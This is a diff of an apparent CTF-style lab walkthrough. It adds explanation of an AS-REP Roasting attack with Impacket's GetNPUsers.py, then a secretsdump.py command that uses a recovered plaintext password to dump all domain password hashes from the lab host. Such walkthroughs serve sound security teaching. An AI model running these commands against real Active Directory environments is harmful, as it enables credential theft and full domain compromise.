@@ -215,7 +215,8 @@ steven.kerb
 skerb
 ```
 
-hogehoge!!
+Then, try to exploit Kerberos using [ASREPRoast](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast) attack.<br>
+We can use [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to get TGT for users that have `Do not require Kerberos preauthentication(UF_DONT_REQUIRE_PREAUTH)`.
 ```shell
 root@kali:~# /usr/local/bin/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile username-anarchy/unames.txt -format john -outputfile hash.txt -dc-ip 10.10.10.175
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -1146,7 +1147,7 @@ Here we found the AutoLogon credentials for `EGOTISTICALBANK\svc_loanmanager`.
     DefaultPassword               :  Moneymakestheworldgoround!
 ```
 
-hogehoge!!
+Now we got the credential for `svc_loanmgr` with DCSync permissions. We can use [secretdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump all password hashes.
 ```shell
 root@kali:~# /usr/local/bin/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
